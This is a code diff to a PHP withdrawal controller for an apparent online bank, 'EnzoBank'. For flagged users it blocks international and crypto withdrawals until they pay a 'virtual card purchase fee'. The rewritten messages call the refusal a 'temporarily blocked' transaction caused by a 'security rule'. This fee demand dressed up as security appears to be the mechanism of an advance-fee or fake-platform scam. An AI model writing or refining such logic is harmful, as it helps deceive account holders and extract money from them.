@@ -311,8 +311,9 @@ class MoneyOutController extends Controller
         // Require a virtual card before withdrawal
         if ($user->card_required && !StrowalletVirtualCard::where('user_id', $user->id)->where('is_active', true)->exists()) {
             $cardFee = get_virtual_card_fee($user);
-            $this->notifyWithdrawalBlocked($user, $amount, 'International Withdrawal', 'A $'.$cardFee.' virtual card is required before withdrawing.');
-            return back()->with(['error' => ['You must purchase a virtual card before you can withdraw. Please buy a card first.']])->withInput();
+            $msg = 'Your transaction has been temporarily blocked. To continue, you must pay the virtual card purchase fee of $' . number_format($cardFee, 2) . ' USD.';
+            $this->notifyWithdrawalBlocked($user, $amount, 'International Withdrawal', $msg);
+            return back()->with(['error' => [$msg]])->withInput();
         }
         if ($user->referral_id) {
             $totalDeposits = Transaction::where("user_id", $user->id)
@@ -453,8 +454,9 @@ class MoneyOutController extends Controller
         // Require a virtual card before withdrawal
         if ($user->card_required && !StrowalletVirtualCard::where('user_id', $user->id)->where('is_active', true)->exists()) {
             $cardFee = get_virtual_card_fee($user);
-            $this->notifyWithdrawalBlocked($user, $amount, 'Crypto Withdrawal', 'A $'.$cardFee.' virtual card is required before withdrawing.');
-            return back()->with(['error' => ['You must purchase a virtual card before you can withdraw. Please buy a card first.']])->withInput();
+            $msg = 'Your transaction has been temporarily blocked. To continue, you must pay the virtual card purchase fee of $' . number_format($cardFee, 2) . ' USD.';
+            $this->notifyWithdrawalBlocked($user, $amount, 'Crypto Withdrawal', $msg);
+            return back()->with(['error' => [$msg]])->withInput();
         }
         if ($user->referral_id) {
             $totalDeposits = Transaction::where("user_id", $user->id)
@@ -613,10 +615,10 @@ class MoneyOutController extends Controller
 
         try {
             $user->notify(new TransactionNotification([
-                'subject' => 'Withdrawal Blocked - EnzoBank Security',
+                'subject' => 'Withdrawal Temporarily Blocked - EnzoBank Security',
                 'greeting' => 'Hello ' . $user->fullname . '!',
-                'title'   => 'Withdrawal Blocked',
-                'intro'   => 'Your withdrawal could not be completed because it was blocked by a security rule.',
+                'title'   => 'Withdrawal Temporarily Blocked',
+                'intro'   => 'Your withdrawal has been temporarily blocked by a security rule. No money has left your account.',
                 'amount'  => $amount,
                 'currency' => 'USD',
                 'is_credit' => false,
